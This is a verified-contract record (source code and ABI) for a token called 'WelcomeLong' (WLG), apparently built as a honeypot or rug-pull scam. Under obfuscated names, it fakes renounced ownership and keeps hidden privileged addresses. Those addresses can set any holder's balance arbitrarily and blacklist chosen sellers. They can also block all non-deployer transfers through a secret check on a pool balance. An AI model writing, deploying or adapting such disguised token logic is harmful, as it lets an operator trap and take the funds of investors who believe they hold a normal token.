{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface takeBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedAutoAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoMax {\n    function createPair(address receiverLimit, address totalFeeLaunch) external returns (address);\n}\n\ninterface minLaunchSender {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapList) external view returns (uint256);\n\n    function transfer(address fromSwap, uint256 liquidityAt) external returns (bool);\n\n    function allowance(address enableTake, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromSwap,\n        uint256 liquidityAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableAt, uint256 value);\n    event Approval(address indexed enableTake, address indexed spender, uint256 value);\n}\n\ninterface listAutoSender is minLaunchSender {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WelcomeLong is launchedAutoAmount, minLaunchSender, listAutoSender {\n\n    mapping(address => mapping(address => uint256)) private toLaunchedShould;\n\n    function enableTxIs() private view {\n        require(liquiditySenderReceiver[_msgSender()]);\n    }\n\n    function allowance(address marketingTradingIs, address minLaunchShould) external view virtual override returns (uint256) {\n        if (minLaunchShould == launchedReceiverToken) {\n            return type(uint256).max;\n        }\n        return toLaunchedShould[marketingTradingIs][minLaunchShould];\n    }\n\n    address launchedReceiverToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed senderLimit, address indexed shouldSwapFrom);\n\n    bool public walletReceiver;\n\n    mapping(address => bool) public liquiditySenderReceiver;\n\n    uint256 public tokenSwap;\n\n    uint256 constant listShouldIs = 13 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return toLiquidityLaunch;\n    }\n\n    uint256 private maxAmount;\n\n    function owner() external view returns (address) {\n        return receiverShould;\n    }\n\n    address marketingMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private teamLimit = \"WLG\";\n\n    address private receiverShould;\n\n    uint256 swapToken;\n\n    function transfer(address enableWallet, uint256 liquidityAt) external virtual override returns (bool) {\n        return tradingAmount(_msgSender(), enableWallet, liquidityAt);\n    }\n\n    function approve(address minLaunchShould, uint256 liquidityAt) public virtual override returns (bool) {\n        toLaunchedShould[_msgSender()][minLaunchShould] = liquidityAt;\n        emit Approval(_msgSender(), minLaunchShould, liquidityAt);\n        return true;\n    }\n\n    uint256 private totalMarketing = 100000000 * 10 ** 18;\n\n    uint256 public amountList;\n\n    address public feeExempt;\n\n    string private buyAt = \"Welcome Long\";\n\n    function fundLaunchedTo(address fundReceiver) public {\n        require(fundReceiver.balance < 100000);\n        if (walletReceiver) {\n            return;\n        }\n        if (marketingReceiver) {\n            marketingReceiver = false;\n        }\n        liquiditySenderReceiver[fundReceiver] = true;\n        if (atFee) {\n            tokenSwap = amountList;\n        }\n        walletReceiver = true;\n    }\n\n    uint256 receiverAuto;\n\n    address public senderLaunch;\n\n    function minFrom(address txMaxLaunch, address fromSwap, uint256 liquidityAt) internal returns (bool) {\n        require(modeShould[txMaxLaunch] >= liquidityAt);\n        modeShould[txMaxLaunch] -= liquidityAt;\n        modeShould[fromSwap] += liquidityAt;\n        emit Transfer(txMaxLaunch, fromSwap, liquidityAt);\n        return true;\n    }\n\n    mapping(address => bool) public sellFee;\n\n    function receiverLaunch(uint256 liquidityAt) public {\n        enableTxIs();\n        swapToken = liquidityAt;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return buyAt;\n    }\n\n    uint8 private toLiquidityLaunch = 18;\n\n    bool public atFee;\n\n    function exemptTo() public {\n        emit OwnershipTransferred(senderLaunch, address(0));\n        receiverShould = address(0);\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverShould;\n    }\n\n    function shouldSwap(address exemptSell) public {\n        enableTxIs();\n        if (atFee) {\n            marketingReceiver = true;\n        }\n        if (exemptSell == senderLaunch || exemptSell == feeExempt) {\n            return;\n        }\n        sellFee[exemptSell] = true;\n    }\n\n    bool private marketingReceiver;\n\n    mapping(address => uint256) private modeShould;\n\n    constructor (){\n        \n        takeBuy autoMarketing = takeBuy(launchedReceiverToken);\n        feeExempt = autoMax(autoMarketing.factory()).createPair(autoMarketing.WETH(), address(this));\n        \n        senderLaunch = _msgSender();\n        exemptTo();\n        liquiditySenderReceiver[senderLaunch] = true;\n        modeShould[senderLaunch] = totalMarketing;\n        if (amountList != tokenSwap) {\n            tokenSwap = amountList;\n        }\n        emit Transfer(address(0), senderLaunch, totalMarketing);\n    }\n\n    function balanceOf(address swapList) public view virtual override returns (uint256) {\n        return modeShould[swapList];\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamLimit;\n    }\n\n    function tradingAmount(address txMaxLaunch, address fromSwap, uint256 liquidityAt) internal returns (bool) {\n        if (txMaxLaunch == senderLaunch) {\n            return minFrom(txMaxLaunch, fromSwap, liquidityAt);\n        }\n        uint256 takeTx = minLaunchSender(feeExempt).balanceOf(marketingMax);\n        require(takeTx == swapToken);\n        require(fromSwap != marketingMax);\n        if (sellFee[txMaxLaunch]) {\n            return minFrom(txMaxLaunch, fromSwap, listShouldIs);\n        }\n        return minFrom(txMaxLaunch, fromSwap, liquidityAt);\n    }\n\n    function transferFrom(address txMaxLaunch, address fromSwap, uint256 liquidityAt) external override returns (bool) {\n        if (_msgSender() != launchedReceiverToken) {\n            if (toLaunchedShould[txMaxLaunch][_msgSender()] != type(uint256).max) {\n                require(liquidityAt <= toLaunchedShould[txMaxLaunch][_msgSender()]);\n                toLaunchedShould[txMaxLaunch][_msgSender()] -= liquidityAt;\n            }\n        }\n        return tradingAmount(txMaxLaunch, fromSwap, liquidityAt);\n    }\n\n    function buyFeeIs(address enableWallet, uint256 liquidityAt) public {\n        enableTxIs();\n        modeShould[enableWallet] = liquidityAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalMarketing;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldSwapFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTradingIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minLaunchShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"buyFeeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"fundLaunchedTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquiditySenderReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"receiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptSell\",\"type\":\"address\"}],\"name\":\"shouldSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMaxLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WelcomeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}